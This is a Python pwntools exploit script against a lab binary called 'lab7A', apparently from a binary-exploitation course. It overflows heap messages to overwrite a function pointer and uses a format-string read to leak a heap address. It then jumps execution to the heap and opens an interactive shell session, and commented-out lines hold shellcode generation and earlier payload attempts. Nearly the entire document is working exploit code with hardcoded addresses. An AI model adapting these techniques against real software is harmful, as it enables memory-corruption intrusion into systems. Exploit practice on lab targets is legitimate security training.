#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386',kernel='amd64')
context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]

exe = './lab7A'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *main
#break *create_message+122
#break *edit_message+234
#break *print_index
break *print_index+158
#break *print_message
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
exe = ELF(exe)
rop = ROP(exe)
#ret = p32(0x80f1af4) #Second allocated heap 
#ret = "aaaa"
#ret = p32(0x08048fd3) #print_message
#ret = p32(0x08048f4f) #enc_dec message
#ret = p32(0x8050260) #printf
#ret = p32(0x08049481) #print index
print_index = p32(0x08049481)
printf = p32(0x8050260) #printf
#payload = asm(shellcraft.sh())

#rop.raw(ret)
#rop.raw("%08x")
#rop.raw("%08x")
#rop.raw("%08x")
#rop.raw("%08x")
#rop.raw("%08x")
#rop.raw(p32(0x080b87c6))
#rop.raw(p32(0x080bd1c6))

#Allocate message 0
io.recv()
io.sendline("1")
io.recv()
io.sendline("131")
io.recv()
io.sendline(fit({127:p32(0xffffffff)}))

#Allocate message 1
io.recv()
io.sendline("1")
io.recv()
io.sendline("131")
io.recv()
io.sendline(fit({127:p32(0xffffffff)}))

#Edit message 0
io.recv()
io.sendline("2")
io.recv()
io.sendline("0")
io.recv()
#io.sendline(fit({140:ret,144:payload},length=500))
payload = 0x90
io.sendline(fit({140:print_index,144:payload}))

#Allocate message 2
io.recv()
io.sendline("1")
io.recv()
io.sendline("131")
io.recv()
io.sendline(fit({127:p32(0xffffffff)}))

#Allocate message 3
io.recv()
io.sendline("1")
io.recv()
io.sendline("131")
io.recv()
io.sendline(fit({127:p32(0xffffffff)}))

#Edit message 2
io.recv()
io.sendline("2")
io.recv()
io.sendline("2")
io.recv()
#io.sendline(fit({140:ret,144:payload},length=500))
#payload = "%4$08x"*100
payload = "%20$x"
#payload = "%x"*100
io.sendline(fit({140:printf,144:payload}))

#Trigger exploit
io.recv()
io.sendline("4")
io.recv()
io.sendline("1")
io.recv()
io.sendline("3")

recv = io.recv()
heap_addr = p32(int(recv[4:11].zfill(8),16)+4)
print(heap_addr)
#print(hexdump(heap_addr))

#Edit message 2
io.sendline("2")
io.recv()
io.sendline("2")
io.recv()
io.sendline(fit({140:heap_addr}))

#Jump to Heap
io.recv()
io.sendline("4")
io.recv()
io.sendline("3")
io.interactive()



#Trigger exploit 

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

